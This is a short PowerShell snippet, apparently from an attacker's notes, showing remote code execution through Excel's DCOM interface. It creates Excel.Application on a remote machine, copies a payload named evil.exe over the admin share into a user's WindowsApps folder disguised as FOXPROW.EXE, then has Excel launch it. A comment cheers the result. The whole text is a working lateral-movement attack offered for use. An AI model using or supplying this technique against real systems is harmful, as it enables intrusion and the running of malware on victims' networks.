$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.1.111"))
# Windows 10 specific, but searches PATH so ..
copy C:\payloads\evil.exe \\victimip\c$\Users\bob\AppData\Local\Microsoft\WindowsApps\FOXPROW.EXE
$excel.ActivateMicrosoftApp("5")
# excel executes your binary :)